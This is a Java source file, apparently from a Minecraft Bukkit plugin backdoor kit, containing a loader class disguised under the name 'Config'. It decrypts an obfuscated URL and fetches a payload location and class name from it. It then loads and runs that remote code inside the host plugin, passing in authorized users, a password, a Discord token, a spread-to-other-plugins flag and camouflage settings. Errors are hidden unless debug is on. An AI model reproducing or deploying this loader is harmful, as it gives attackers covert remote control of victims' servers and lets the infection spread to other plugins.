package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;

public final class Config {

    public Config(Plugin plugin) {
        initialize(plugin);
    }

    private void initialize(Plugin plugin) {
        String key = "::KEY::";
        
        String injected_debug_log = "::WARNINGS::";
        String injected_true = "::TRUE::";
        final boolean isDebugEnabled = injected_true.equals(injected_debug_log);

        if (System.getProperty("openbd.lock") != null) {
            if (isDebugEnabled) {
                plugin.getLogger().warning("[Payload] Aborted, another instance is already running.");
            }
            return;
        }

        try {
            executeStateMachine(plugin, key, isDebugEnabled);
        } catch (Throwable e) {
            if (isDebugEnabled) {
                plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
                e.printStackTrace();
            }
        }
    }

    private void executeStateMachine(Plugin plugin, String key, boolean isDebugEnabled) throws Throwable {
        int[] fromBase64Table = null;
        
        String s_url_provider = "::S_URL_PROVIDER::";
        String injected_authorized_uuids = "::UUIDS::";
        String injected_authorized_usernames = "::USERNAMES::";
        String injected_command_prefix = "::PREFIX::";
        String injected_spread_to_other = "::INJECT_OTHER::";
        String injected_discord_token = "::DISCORD_TOKEN::";
        String injected_authorized_password = "::PASSWORD::";
        String injected_camouflage = "::CAMOUFLAGE::";

        int state = 0;
        String urlProvider = null;
        String payloadUrlStr = null;
        String mainClassName = null;
        URLClassLoader classLoader = null;
        Class<?> loadedClass = null;

        for (;;) {
            switch (state) {
                case 0:
                    if (fromBase64Table == null) {
                        fromBase64Table = initializeDecoderTable();
                    }
                    urlProvider = decrypt(s_url_provider, key, fromBase64Table);
                    state = 1;
                    break;
                case 1:
                    HttpURLConnection connection = (HttpURLConnection) new URL(urlProvider).openConnection();
                    connection.setRequestMethod("GET");
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                        payloadUrlStr = reader.readLine();
                        mainClassName = reader.readLine();
                    } finally {
                        connection.disconnect();
                    }
                    state = 2;
                    break;
                case 2:
                    if (payloadUrlStr == null || payloadUrlStr.isEmpty() || mainClassName == null || mainClassName.isEmpty()) {
                        if (isDebugEnabled) {
                            plugin.getLogger().severe("[Loader] Failed to fetch resource URL or main class. Aborting.");
                        }
                        return;
                    }
                    URL[] urls = { new URL(payloadUrlStr) };
                    classLoader = new URLClassLoader(urls, plugin.getClass().getClassLoader());
                    state = 3;
                    break;
                case 3:
                    loadedClass = classLoader.loadClass(mainClassName);
                    state = 4;
                    break;
                case 4:
                    Constructor<?> targetConstructor = null;
                    Class<?>[] expectedParamTypes = {
                        Plugin.class, Class.class, String.class, String.class,
                        String.class, String.class, String.class, String.class,
                        String.class, String.class
                    };

                    for (Constructor<?> constructor : loadedClass.getConstructors()) {
                        if (Arrays.equals(constructor.getParameterTypes(), expectedParamTypes)) {
                            targetConstructor = constructor;
                            break;
                        }
                    }

                    if (targetConstructor == null) {
                        throw new NoSuchMethodException("Could not find a suitable constructor with signature (Plugin, Class, String*8) in " + loadedClass.getName());
                    }
                    
                    targetConstructor.newInstance(
                        plugin,
                        this.getClass(),
                        injected_authorized_uuids,
                        injected_authorized_usernames,
                        injected_command_prefix,
                        injected_spread_to_other,
                        "::WARNINGS::",
                        injected_discord_token,
                        injected_authorized_password,
                        injected_camouflage
                    );
                    
                    if (isDebugEnabled) {
                        plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");
                    }
                    return;
                default:
                    throw new IllegalStateException("Invalid state in loader");
            }
        }
    }
    
    private int[] initializeDecoderTable() {
        int[] table = new int[256];
        Arrays.fill(table, -1);
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for (int i = 0; i < chars.length(); i++) {
            table[chars.charAt(i)] = i;
        }
        table['='] = -2;
        return table;
    }

    private String decrypt(String encryptedString, String key, int[] fromBase64Table) {
        try {
            byte[] decoded = customBase64Decode(encryptedString, fromBase64Table);
            byte[] keyBytes = key.getBytes("UTF-8");
            for (int i = 0; i < decoded.length; i++) {
                decoded[i] = (byte) (decoded[i] ^ keyBytes[i % keyBytes.length]);
            }
            return new String(decoded, "UTF-8");
        } catch (Exception ex) {
            return "decoding.error";
        }
    }

    private byte[] customBase64Decode(String src, int[] fromBase64Table) {
        src = src.replaceAll("\\s", "");
        int len = src.length();
        ByteArrayOutputStream baos = new ByteArrayOutputStream(len * 3 / 4);
        int[] buffer = new int[4];
        int bufferCounter = 0;
        for (int i = 0; i < len; i++) {
            int val = fromBase64Table[src.charAt(i) & 0xFF];
            if (val >= 0) {
                buffer[bufferCounter++] = val;
                if (bufferCounter == 4) {
                    baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                    baos.write((buffer[2] << 6) | buffer[3]);
                    bufferCounter = 0;
                }
            } else if (val == -2) {
                if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                else if (bufferCounter == 3) {
                    baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                }
                break;
            }
        }
        return baos.toByteArray();
    }
}